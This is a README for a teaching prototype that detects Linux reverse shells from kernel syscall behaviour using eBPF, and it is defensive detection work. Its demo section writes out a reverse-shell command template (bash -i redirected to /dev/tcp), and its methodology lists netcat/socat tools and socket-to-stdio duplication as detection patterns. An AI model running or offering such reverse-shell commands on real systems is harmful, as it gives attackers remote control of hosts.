# RSBP — Reverse-Shell Behavioural Profiler

RSBP is a research/teaching prototype that detects reverse shells on Linux by their
**behaviour at the kernel**, not by their payload or destination. It attaches eBPF
tracepoints to a small set of syscalls, correlates them per process, and alerts only
when it sees the behavioural signature of a reverse shell — a socket duplicated onto a
shell's standard I/O, a `bash`/`/dev/tcp` redirection, a `fork`+`pipe` relay, or a
netcat/socat-family tool making an outbound connection.

> It is **not** an EDR or a general monitoring agent, and not production software. It is
> a focused, open, reverse-shell detector meant to be demonstrated and explained.

## The idea in one line

A single indicator (a network connection, a shell exec, an outbound packet) is ambiguous.
The **combination** — `execve` → `socket` → `connect` → `dup2`-to-stdio, correlated within
one process — is what distinguishes a reverse shell from ordinary activity. RSBP scores
that combination; a plain outbound connection never alerts.

## Architecture

```
 kernel syscalls ──eBPF tracepoints──▶ ring buffer ──▶ Go collector
      (11 probes)                                         │
                                                          ▼
                                          per-process correlation (sessions)
                                                          │
                                                          ▼
                              behavioural gate + weighted scoring + rules
                                                          │
                                                          ▼
                                   alert ──▶ JSONL sink ──▶ local dashboard / API
                                                 └────────▶ (optional) Elasticsearch
```

- **Probes (11 tracepoints):** `execve` (enter/exit), `socket` (enter/exit), `connect`,
  `dup2`, `dup3`, `fork`, `clone3`, `pipe`, `pipe2`.
- **Correlation** keys sessions by PID **and process start-time**, so a recycled PID can't
  inherit a previous process's state.
- **Behavioural gate** requires a real reverse-shell behaviour before anything is scored;
  destination signals (external IP, known C2 port) only adjust severity.

## Requirements

- Linux kernel **≥ 5.8** with **BTF** (`/sys/kernel/btf/vmlinux` present) and syscall
  tracepoints (`tracefs`). A standard Ubuntu 22.04/24.04 kernel qualifies.
- `CAP_BPF` + `CAP_SYS_ADMIN` (or root) to load/attach.
- **Go ≥ 1.23** to build. (The distro `golang-go` on 22.04 is too old — install from
  go.dev or a backports/snap.)
- To *regenerate* the eBPF object (optional — a prebuilt one is committed): `clang` +
  `libbpf-dev`.

**WSL2 note:** the default WSL2 kernel is unreliable for tracepoint attachment. Use a real
Ubuntu VM (VirtualBox/Hyper-V/multipass) for the demo. ~4 GB RAM is plenty; no GPU needed.

## Quick start (laptop/VM demo)

```bash
# 1. Build (Go only — no clang/libbpf needed; the eBPF object is committed)
make build

# 2. Prepare the machine: mount tracefs, create /var dirs, set capabilities
sudo bash scripts/setup-demo.sh bin/rsbpd

# 3. Run the deterministic demo (benign baseline → one controlled reverse shell → alert)
sudo ./demo/reverse_shell_demo.sh

# 4. Watch it live in a browser on the same machine
#    http://127.0.0.1:9001/
```

Everything above is **offline and local** — no Internet, no external C2, no API keys, no
Elasticsearch. The demo's targets are lab addresses on the loopback device.

## Running the daemon directly

```bash
sudo ./bin/rsbpd run --config config/demo.yaml   # offline demo profile (JSONL only)
# full profile with Elasticsearch/enrichment lives in config/rsbp.yaml (advanced, below)

./bin/rsbpd status                               # health via the local API
./bin/rsbpd alerts --follow                      # tail alerts
./bin/rsbpd version
```

Endpoints on `127.0.0.1:9001`: `/` (dashboard), `/health`, `/stats`, `/alerts`, `/metrics`
(Prometheus, on `:9090`).

## The demo, stage by stage

`demo/reverse_shell_demo.sh` runs:

1. **Prepare** — start RSBP, show `11/11` probes attached.
2. **Baseline** — `wget`, `ssh`, a python TCP client, `git`; expected result: **0 alerts**.
3. **Simulate** — one controlled `bash -i >& /dev/tcp/<lab-ip>/<port>` against a passive
   local listener.
4. **Detect** — the single alert, with its syscall chain, behavioural pattern, and score.

Sub-commands: `… demo/reverse_shell_demo.sh baseline` or `… attack`.

## Example detection (JSONL)

```json
{
  "severity": "Critical", "score": 1.0, "pattern": "DirectDup2Shell",
  "syscall_chain": ["execve","socket","connect","dup2"],
  "fired_rules": ["ExternalIPRule","C2PortRule","CorrelatedBehaviorRule","LowFPCombinedRule"],
  "process": {"pid": 12345, "exe_path": "/usr/bin/bash", "comm": "bash"},
  "network": {"remote_ip": "203.0.113.10", "remote_port": "4444", "protocol": "tcp"},
  "mitre_techniques": [{"id": "T1059"}, {"id": "T1104"}]
}
```

## Detection methodology

**Behavioural core (any one required to alert):** socket duplicated onto stdin/stdout/stderr
(`dup2`/`dup3`); `bash`/`/dev/tcp` (or `/dev/udp`) redirection; `fork`+`pipe` relay; an
`nc`/`ncat`/`netcat`/`socat` process making an outbound `connect`; or a match against a
named pattern in `internal/correlation/patterns.go`.

**Severity modifiers (only once the core is present):** external (non-RFC1918) remote IP,
classic C2 port, ephemeral high port. Scoring is **time-independent**.

A plain outbound connection — `apt`, `wget`, `ssh`, a generic client — has no behavioural
core and is **not** alerted.

## Limitations (be honest about these)

- Validated on scripted local scenarios, not in the wild. State detection as **"N/N scripted
  lab scenarios"**, with the exact denominator — never a percentage.
- Correlation is single-host and in-memory. A reverse shell split across processes in ways
  not covered by the patterns may be missed.
- PID reuse is handled via process start-time; containers/namespaces are not specially handled.
- The behavioural gate trades some recall for very low false positives — by design.
- Not benchmarked for throughput; make no "zero overhead" / "production" claims.

## Configuration

- `config/demo.yaml` — offline demo profile: JSONL only, Elasticsearch **off**, enrichment
  **offline** (no outbound calls), quiet logs. **Use this for the talk.**
- `config/rsbp.yaml` — full reference profile (Elasticsearch sink, enrichment, etc.).

Key knobs: `detection.score_threshold`, `detection.window_seconds`,
`enrichment.offline`, `output.*.enabled`, `whitelist.*`.

## Development

```bash
make test        # go test ./...
make lint        # go vet ./...
make build       # daemon only (no BPF toolchain)
make generate    # regenerate the eBPF object (needs clang + libbpf-dev)
```

The eBPF C is `bpf/rsbp.bpf.c`; the event struct is `bpf/headers/rsbp.h` and must stay in
sync with `internal/types.SyscallEvent` and the loader's decode struct.

## Reproducibility

A fresh Ubuntu 24.04 VM + `make build && sudo bash scripts/setup-demo.sh bin/rsbpd &&
sudo ./demo/reverse_shell_demo.sh` reproduces the demo: benign baseline silent, one
controlled reverse shell detected, shown live at `http://127.0.0.1:9001/`.

## Advanced: full monitoring stack (optional, not needed for the demo)

`deployments/monitoring/docker-compose.yml` brings up Elasticsearch, Kibana, Grafana,
Filebeat and Prometheus (~3 GB RAM). It is **not** required for the demo and is heavier /
more failure-prone on a laptop; prefer the built-in dashboard for a live talk. If you use
it, set `output.elasticsearch.enabled: true` in `config/rsbp.yaml` and note that the
compose file publishes ES/Grafana/Kibana on non-default host ports.
